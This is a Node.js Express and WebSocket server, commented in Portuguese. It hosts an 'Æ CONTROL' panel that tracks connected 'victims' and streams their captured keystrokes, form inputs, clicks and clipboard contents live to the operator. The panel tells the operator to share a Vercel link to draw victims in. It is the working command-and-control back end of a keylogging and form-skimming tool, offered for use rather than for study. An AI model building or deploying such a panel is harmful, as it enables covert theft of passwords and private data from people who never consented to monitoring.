const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Banco de dados em memória
const sessions = {};
const adminClients = new Set();

// ---------- SERVE O PAINEL BONITO ----------
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Æ Painel de Controle</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0d1a;
      color: #e0e5ff;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      display: flex;
      height: 100vh;
      overflow: hidden;
    }
    /* Sidebar */
    .sidebar {
      width: 280px;
      background: #13162b;
      border-right: 1px solid #2a2f55;
      display: flex;
      flex-direction: column;
      padding: 20px;
      flex-shrink: 0;
    }
    .sidebar h1 {
      font-size: 22px;
      font-weight: 700;
      background: linear-gradient(135deg, #00f0ff, #7b2ffc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
      letter-spacing: -0.5px;
    }
    .sidebar .status {
      font-size: 13px;
      color: #7b8ab8;
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .sidebar .status .dot {
      width: 8px;
      height: 8px;
      background: #00ff88;
      border-radius: 50%;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } }
    .sidebar .counter {
      background: #1c2142;
      padding: 12px 16px;
      border-radius: 12px;
      margin-bottom: 20px;
      border-left: 3px solid #00f0ff;
    }
    .sidebar .counter span { font-size: 28px; font-weight: 700; color: #fff; }
    .sidebar .counter small { color: #8892c0; font-size: 13px; display: block; }
    #victim-list {
      flex: 1;
      overflow-y: auto;
      list-style: none;
      margin-top: 5px;
    }
    #victim-list li {
      padding: 12px 14px;
      margin-bottom: 6px;
      background: #181d3a;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.2s;
      border-left: 2px solid transparent;
      font-size: 14px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    #victim-list li:hover { background: #222a52; }
    #victim-list li.active { border-left-color: #00f0ff; background: #1f264a; }
    #victim-list li .badge {
      background: #2a3366;
      padding: 2px 10px;
      border-radius: 30px;
      font-size: 11px;
      color: #aab4e0;
    }
    /* Área principal */
    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 25px 30px;
      background: #0b0d1a;
      overflow: hidden;
    }
    .main-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    .main-header h2 {
      font-weight: 400;
      font-size: 20px;
      color: #bcc6f0;
    }
    .main-header h2 strong { color: #fff; font-weight: 600; }
    .main-header .info-badge {
      background: #1a1f3d;
      padding: 6px 16px;
      border-radius: 30px;
      font-size: 13px;
      color: #8892c0;
    }
    #log-container {
      flex: 1;
      background: #0e1124;
      border-radius: 16px;
      border: 1px solid #1e2346;
      padding: 15px 20px;
      overflow-y: auto;
      font-family: 'JetBrains Mono', 'Fira Code', monospace;
      font-size: 13px;
      line-height: 1.6;
    }
    #log-container .log-entry {
      padding: 4px 0;
      border-bottom: 1px solid #171d38;
      display: flex;
      gap: 12px;
      animation: fadeIn 0.2s ease;
    }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; } }
    .log-entry .time { color: #4a5580; white-space: nowrap; }
    .log-entry .sess-id { color: #7b8ab8; background: #1a1f3d; padding: 0 8px; border-radius: 4px; font-size: 11px; }
    .log-entry .content { color: #d0d9ff; word-break: break-all; }
    .log-entry .type-tag { 
      background: #2a2f55; padding: 0 10px; border-radius: 12px; font-size: 10px; 
      text-transform: uppercase; color: #aab4e0; letter-spacing: 0.5px;
    }
    .highlight-input { color: #ffd966; }
    .highlight-click { color: #ff7b9c; }
    .highlight-key { color: #6dd5ed; }
    .highlight-clip { color: #b38bff; }
    ::-webkit-scrollbar { width: 5px; }
    ::-webkit-scrollbar-track { background: #0b0d1a; }
    ::-webkit-scrollbar-thumb { background: #2a2f55; border-radius: 10px; }
    .empty-state { color: #3d4670; text-align: center; padding: 40px 0; font-size: 15px; }
  </style>
</head>
<body>
  <div class="sidebar">
    <h1>Æ CONTROL</h1>
    <div class="status"><span class="dot"></span> Sistema ativo</div>
    <div class="counter">
      <span id="total-count">0</span>
      <small>Vítimas conectadas</small>
    </div>
    <ul id="victim-list"></ul>
    <div style="margin-top: 12px; font-size: 11px; color: #2f3a66; text-align: center;">made by imrudra77</div>
  </div>
  <div class="main">
    <div class="main-header">
      <h2>📡 Monitorando: <strong id="selected-id">Nenhuma</strong></h2>
      <span class="info-badge" id="event-counter">0 eventos</span>
    </div>
    <div id="log-container">
      <div class="empty-state">Aguardando conexões... <br> Compartilhe seu link do Vercel.</div>
    </div>
  </div>

  <script>
    const WS_URL = \`wss://\${window.location.host}\`;
    let ws;
    let currentVictim = null;
    let allData = {}; // sessId -> [logs]
    let selectedId = null;

    function connect() {
      ws = new WebSocket(WS_URL);
      ws.onopen = () => {
        ws.send(JSON.stringify({ type: 'admin' }));
        console.log('[+] Painel conectado ao servidor');
      };
      ws.onmessage = (e) => {
        const msg = JSON.parse(e.data);
        if (msg.type === 'update') {
          // Atualiza o banco local
          if (!allData[msg.sess]) allData[msg.sess] = [];
          allData[msg.sess].push(msg);
          renderSidebar();
          if (selectedId === msg.sess) renderLogs(selectedId);
        } else if (msg.type === 'init') {
          // Recebe todas as sessões existentes
          allData = msg.data || {};
          renderSidebar();
          if (Object.keys(allData).length > 0) {
            selectVictim(Object.keys(allData)[0]);
          }
        }
      };
      ws.onclose = () => setTimeout(connect, 2000);
    }

    function renderSidebar() {
      const ids = Object.keys(allData);
      document.getElementById('total-count').textContent = ids.length;
      const list = document.getElementById('victim-list');
      list.innerHTML = '';
      ids.forEach(id => {
        const li = document.createElement('li');
        li.className = (selectedId === id) ? 'active' : '';
        const count = allData[id].length;
        li.innerHTML = \`\${id.slice(0, 8)}... <span class="badge">\${count} logs</span>\`;
        li.onclick = () => selectVictim(id);
        list.appendChild(li);
      });
    }

    function selectVictim(id) {
      selectedId = id;
      document.getElementById('selected-id').textContent = id;
      renderSidebar();
      renderLogs(id);
    }

    function renderLogs(id) {
      const container = document.getElementById('log-container');
      const logs = allData[id] || [];
      document.getElementById('event-counter').textContent = logs.length + ' eventos';
      if (logs.length === 0) {
        container.innerHTML = '<div class="empty-state">Nenhum dado capturado ainda para esta vítima.</div>';
        return;
      }
      let html = '';
      logs.forEach(log => {
        const time = new Date(log.timestamp).toLocaleTimeString('pt-BR');
        let content = log.value || log.key || log.text || log.target || JSON.stringify(log);
        if (content.length > 100) content = content.slice(0, 100) + '…';
        let typeClass = '';
        if (log.type === 'input') typeClass = 'highlight-input';
        else if (log.type === 'click') typeClass = 'highlight-click';
        else if (log.type === 'keydown') typeClass = 'highlight-key';
        else if (log.type === 'clipboard') typeClass = 'highlight-clip';
        
        html += \`<div class="log-entry">
          <span class="time">\${time}</span>
          <span class="type-tag">\${log.type}</span>
          <span class="content \${typeClass}">\${content}</span>
        </div>\`;
      });
      container.innerHTML = html;
      container.scrollTop = container.scrollHeight;
    }

    connect();
  </script>
</body>
</html>
  `);
});

// ---------- WEBSOCKET LÓGICA ----------
wss.on('connection', (ws) => {
  ws.isAdmin = false;

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
      
      // Admin registra
      if (data.type === 'admin') {
        ws.isAdmin = true;
        adminClients.add(ws);
        // Envia estado atual
        ws.send(JSON.stringify({ type: 'init', data: sessions }));
        return;
      }

      // Dados de vítima (tem sess)
      if (data.sess) {
        if (!sessions[data.sess]) sessions[data.sess] = [];
        sessions[data.sess].push(data);
        
        // Broadcat para todos os admins
        adminClients.forEach(client => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'update', sess: data.sess, ...data }));
          }
        });
      }
    } catch (e) {
      // ignora mensagens inválidas
    }
  });

  ws.on('close', () => {
    if (ws.isAdmin) adminClients.delete(ws);
  });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`Æ Bot Painel rodando na porta ${PORT}`);
});